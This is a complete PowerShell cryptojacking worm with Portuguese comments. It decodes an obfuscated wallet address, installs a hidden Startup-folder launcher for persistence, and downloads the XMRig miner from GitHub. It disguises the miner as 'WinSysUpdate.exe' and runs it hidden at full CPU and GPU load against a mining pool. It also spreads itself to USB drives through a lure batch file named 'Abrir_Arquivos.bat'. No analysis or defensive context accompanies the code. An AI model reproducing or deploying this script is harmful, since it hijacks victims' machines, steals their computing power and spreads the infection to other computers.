$b64 = "MHg3ZDBCMDI5Zjk2MzQ4ODk2RWRhQzMxOTgwMTQ5Njg2MWM4ODhiQTE0"
$wallet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
$url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$tempBase = "$env:LOCALAPPDATA\WinSysUpdate"
$dir = "$tempBase\bin"
$logFile = "$tempBase\sys_log.txt"

# 1. Persistência
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = "$startupFolder\WinSysUpdate.vbs"
if (-not (Test-Path $shortcutPath)) {
    $vbsContent = "CreateObject(`"Wscript.Shell`").Run `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"`" + `"$PSCommandPath`" + `"`"`", 0, False"
    Set-Content -Path $shortcutPath -Value $vbsContent
}

# 2. Download e Instalação Silenciosa
if (-not (Test-Path $dir)) {
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    $zip = "$tempBase\update.zip"
    Invoke-WebRequest -Uri $url -OutFile $zip
    Expand-Archive -Path $zip -DestinationPath $dir -Force
    Remove-Item $zip
}

$xmrigOrig = Get-ChildItem -Path $dir -Filter xmrig.exe -Recurse | Select-Object -First 1
$newPath = Join-Path $dir "WinSysUpdate.exe"
if ($xmrigOrig -and -not (Test-Path $newPath)) {
    Move-Item $xmrigOrig.FullName $newPath -Force
}

# 3. Execução do Minerador (CPU + GPU)
if (Test-Path $newPath) {
    $process = Get-Process "WinSysUpdate" -ErrorAction SilentlyContinue
    if (-not $process) {
        $args = "-o rx.unmineable.com:3333 -u MATIC:$($wallet).srv01#p0o1-l2m3 -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --randomx-1gb-pages --cuda --opencl --log-file `"$logFile`""
        Start-Process -FilePath $newPath -ArgumentList $args -WindowStyle Hidden
    }
}

# 4. Propagação Automática (USB)
$usbScript = {
    param($src, $walletB64)
    while ($true) {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { (Get-Volume -DriveLetter $_.Name).DriveType -eq 2 }
        foreach ($d in $drives) {
            $dest = Join-Path ($d.Root) "SystemUpdate"
            if (-not (Test-Path $dest)) {
                New-Item -ItemType Directory -Path $dest -Force | Out-Null
                Copy-Item -Path "$src\*" -Destination $dest -Recurse -Force
                $bat = "@echo off`r`npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"%~dp0miner.ps1`"`r`nexit"
                Set-Content -Path (Join-Path $d.Root "Abrir_Arquivos.bat") -Value $bat
            }
        }
        Start-Sleep -Seconds 30
    }
}
if (-not (Get-Job -Name "USBMonitor" -ErrorAction SilentlyContinue)) {
    Start-Job -Name "USBMonitor" -ScriptBlock $usbScript -ArgumentList (Get-Item $PSScriptRoot).FullName, $b64
}
